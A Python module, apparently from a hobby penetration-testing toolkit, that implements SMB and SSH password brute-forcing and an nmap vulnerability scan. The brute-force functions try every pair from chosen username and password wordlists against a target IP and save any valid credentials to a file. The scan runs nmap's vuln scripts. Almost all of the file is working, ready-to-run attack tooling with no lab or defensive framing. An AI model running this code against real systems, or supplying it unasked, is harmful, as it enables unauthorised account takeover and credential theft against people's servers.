from core.utils import open_file
from core.colors import Colors as cl
from impacket.smbconnection import SMBConnection
from core.help import trump, yamete
import time
import os
import paramiko
import socket
import nmap
import json


def attempt_smb_login(target_ip, username, password):
    try:
        # we attempt to login to the smb service of the given ip, using the credentials
        # SMBs default port is 445
        conn = SMBConnection(target_ip, target_ip, sess_port=445, timeout=3)
        conn.login(username, password)
        print(f"{cl.green}[+] SUCCESS: {username}:{password}{cl.reset}")
        # easter egg!!
        trump()
        #  once we have the credentials we clean the connection to clean up
        conn.close()
        return True
    except Exception as e:
        #print(f"{cl.red}[-] FAILED: {username}:{password} | {str(e)}{cl.reset}")
        return False
    
def attempt_ssh_login(ip, username, password):
    try:
        # similar to SMB we try to enstablish SSH connection
        # we create a new SSH obhect using paramiko
        ssh = paramiko.SSHClient()
        # we add autamitically the host key
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        # while trying to connect we set timout 3 to wait before give up, and also 5 for the ssh banner (to avoid hangs)
        ssh.connect(ip, username=username, password=password, timeout=3, banner_timeout=5)
        print(f"{cl.green}[+] SSH SUCCESS: {username}:{password}{cl.reset}")
        # easter egg
        yamete()
        # once we have the credentials we close the connection and cleanup
        ssh.close()
        return True
    except (paramiko.AuthenticationException, paramiko.SSHException, socket.error):
        return False

def brute_force_smb():
    try:
        print(f"{cl.yellow}[~] SMB Brute Force Attack: Provide the target IP and choose wordlists for usernames and passwords.{cl.reset}")
        target_ip = input(f"{cl.blue}[>] Target IP (e.g. 192.168.0.53): {cl.reset}").strip()
        if not target_ip:
            raise Exception("No target IP provided.") 
        
        # we are loading the usernames and the passwords seperately to generate more combinations
        user_file_name, user_file_path = open_file("Username wordlist")
        print(f"{cl.cyan}[*] Selected username wordlist: {user_file_name}{cl.reset}")
        password_file_name, password_file_path = open_file("Password wordlist")
        print(f"{cl.cyan}[*] Selected password wordlist: {password_file_name}{cl.reset}")
        
        with open(user_file_path, "r") as uf:
            usernames = [line for line in uf.read().splitlines() if line]

        with open(password_file_path, "r") as pf:
            passwords = [line for line in pf.read().splitlines() if line]

        print(f"{cl.cyan}[*] Loaded {len(usernames)} users and {len(passwords)} passwords.{cl.reset}")
        print(f"{cl.cyan}[~] Starting SMB brute-force attack on {target_ip}...{cl.reset}")

        # we are trying to login with each combination with 0.5 second delay to avoid overload the target, Ideally it could be 1 second.
        for username in usernames:
            for password in passwords:
                success = attempt_smb_login(target_ip, username, password)
                time.sleep(0.5)
                # if we find the credentials we save them with the ip of the target(without the dots to avoid file conflicts)
                if success:
                    os.makedirs("output", exist_ok=True)
                    filename = f"output/{target_ip.replace('.', '')}_creds.txt"
                    with open(filename, "a") as log:
                        log.write(f"SMB | {target_ip} | {username}:{password}\n")
                    print(f"{cl.green}[+] Credentials saved to {filename}{cl.reset}")
                    print(f"{cl.yellow}[!] Stopping brute-force. Valid credentials found!{cl.reset}")
                    return
                
        print(f"{cl.yellow}[!] Brute force completed - no valid credentials found.{cl.reset}")

    except KeyboardInterrupt:
        print(f"\n{cl.yellow}[!] SMB brute force interrupted by user.{cl.reset}")
        return
    except Exception as e:
        print(f"{cl.red}[!] Brute force SMB failed: {e}{cl.reset}")


def brute_force_ssh():
    try:
        # Brute force ssh is very similar logic to smb (copy paste just used the ssh login logic)
        print(f"{cl.yellow}[~] SSH Brute Force Attack: Provide the target IP and choose wordlists for usernames and passwords.{cl.reset}")
        target_ip = input(f"{cl.blue}[>] Target IP (e.g. 192.168.0.53): {cl.reset}").strip()
        if not target_ip:
            raise Exception("No target IP provided.") 

        user_file_name, user_file_path = open_file("Username wordlist")
        print(f"{cl.cyan}[*] Selected username wordlist: {user_file_name}{cl.reset}")
        password_file_name, password_file_path = open_file("Password wordlist")
        print(f"{cl.cyan}[*] Selected password wordlist: {password_file_name}{cl.reset}")
        
        with open(user_file_path, "r") as uf:
            usernames = [line for line in uf.read().splitlines() if line]

        with open(password_file_path, "r") as pf:
            passwords = [line for line in pf.read().splitlines() if line]

        print(f"{cl.cyan}[*] Loaded {len(usernames)} users and {len(passwords)} passwords.{cl.reset}")
        print(f"{cl.cyan}[~] Starting SSH brute-force attack on {target_ip}...{cl.reset}")

        for username in usernames:
            for password in passwords:
                success = attempt_ssh_login(target_ip, username, password)
                time.sleep(0.5)
                if success:
                    os.makedirs("output", exist_ok=True)
                    filename = f"output/{target_ip.replace('.', '')}_creds.txt"
                    with open(filename, "a") as log:
                        log.write(f"SSH | {target_ip} | {username}:{password}\n")
                    print(f"{cl.green}[+] Credentials saved to {filename}{cl.reset}")
                    print(f"{cl.yellow}[!] Stopping brute-force. Valid credentials found!{cl.reset}")
                    return
                
        print(f"{cl.yellow}[!] Brute force completed - no valid credentials found.{cl.reset}")

    except KeyboardInterrupt:
        print(f"\n{cl.yellow}[!] SSH brute force interrupted by user.{cl.reset}")
        return
    except Exception as e:
        print(f"{cl.red}[!] Brute force SSH failed: {e}{cl.reset}")

def scan_vulnerabilities():
    try:
        # Function to perform a vulnerability scan on the target IP using Nmap.
        print(f"{cl.yellow}[~] Vulnerability Scan: Provide the target IP to scan for known vulnerabilities using Nmap.{cl.reset}")
        target_ip = input(f"{cl.blue}[>] Target IP (e.g. 192.168.0.53): {cl.reset}").strip()
        if not target_ip:
            raise Exception("No target IP provided.")

        print(f"{cl.cyan}[~] Running Nmap vulnerability scan on {target_ip}...{cl.reset}")
        print(f"{cl.cyan}[~] This might take a while..{cl.reset}")

        # we scan the client with known nmap commands. This can me modified, we can add -O, -A and more nmap commands for deeper and more aggressive scan.
        # in our script '-sV' is for version detection, and '--script vuln' runs vulnerability scripts.
        nm = nmap.PortScanner()
        result = nm.scan(target_ip, arguments='-sV --script vuln')

        # we save the results to examine them later in json format
        os.makedirs("output", exist_ok=True)
        filename = f"output/{target_ip.replace('.', '')}_vulnscan.txt"
        with open(filename, "w") as f:
            f.write(json.dumps(result, indent=2))

        print(f"{cl.green}[+] Scan complete! Results saved to {filename}{cl.reset}")

    except KeyboardInterrupt:
        print(f"\n{cl.yellow}[!] Vulnerability scan interrupted by user.{cl.reset}")
    except Exception as e:
        print(f"{cl.red}[!] Error scanning for vulnerabilities: {e}{cl.reset}")
